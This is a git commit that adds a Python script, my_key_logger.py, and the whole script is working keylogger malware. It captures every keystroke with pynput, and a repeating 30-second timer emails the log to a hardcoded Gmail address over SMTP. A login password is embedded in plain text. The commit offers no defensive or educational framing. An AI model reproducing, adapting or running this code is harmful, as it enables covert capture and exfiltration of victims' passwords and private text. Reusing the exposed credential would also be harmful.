2945306c4aa4219ae933c9d8ac2ce22ed0097df4
FatihAlpaslan <f.alpaslanbozkurt@gmail.com>
2024-07-28 11:44:50 -0400

    Initial commit

---
+++ my_key_logger.py
@@ -0,0 +1,49 @@
+import pynput.keyboard
+import smtplib
+import threading
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+log = ""
+def callback_function(key):
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key==key.space:
+            log = log+" "
+        else:
+            log= log+str(key)
+    except:
+        pass
+
+    print(log)
+def send_email(email,password,message):
+    email_server = smtplib.SMTP('smtp.gmail.com',587)
+    email_server.starttls()
+    email_server.login(email,password)
+    email_server.sendmail(email,email,message)
+    email_server.quit()
+def thread_function():
+    global log
+    if len(log) > 10:
+        message = MIMEMultipart("")
+        message["Subject"] = "Key LOG!"
+
+        part1 = MIMEText(log, "plain")
+        message.attach(part1)
+        msg = message.as_string()
+
+        send_email("testtesthesabim@gmail.com", "ipsp ralf zcvw dilo", msg)
+
+        log = ""
+
+    timer_object = threading.Timer(30, thread_function)
+    timer_object.start()
+
+
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+#threading
+with keylogger_listener:
+    thread_function()
+    keylogger_listener.join()
